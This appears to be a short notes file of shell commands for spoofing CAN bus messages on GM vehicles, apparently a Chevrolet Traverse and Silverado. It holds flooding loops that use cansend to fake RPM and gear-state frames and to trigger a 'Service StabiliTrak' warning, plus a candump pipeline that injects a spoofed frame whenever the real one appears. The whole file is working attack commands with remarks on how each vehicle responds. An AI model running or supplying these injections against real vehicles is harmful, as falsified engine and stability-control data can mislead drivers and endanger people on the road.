# vcan0
while true; do cansend can0 0C9#8021C0071B101000; sleep 0.002; done

# can0
while true; do cansend can0 0C9#8021C0071B101000; sleep 0.002; done

# monitor the bus; send spoofed packet when real packet detected
candump can0 | grep " 0C9 " | while read line; do cansend can0 0C9#8021C0071B101000; done

# results in Service StabiliTrak
while true; do cansend can0 0F1#34020040; sleep 0.002; done
while true; do cansend can0 0F1#00020040; sleep 0.002; done

# spoof RPMs
# zero RPMs (park/not in gear)
while true; do cansend can0 0C9#00000000004008; sleep 0.002; done

# idle (park/not in gear)
while true; do cansend can0 0C9#840E2100004008; sleep 0.002; done

# idle (not in park/in gear)
while true; do cansend can0 0C9#840BD80B004108; sleep 0.002; done

# 2000 RPMs (not in park/in gear)
while true; do cansend can0 0C9#8021C0071B101000; sleep 0.002; done

# 2000 RPMs (not in park/in gear)
while true; do cansend can0 0C9#8021C0071B102000; sleep 0.002; done

# can fool the Traverse, but it will stop responding to the bad messages
# can fool the Silverado, but it will stop responding to the bad messages even quicker
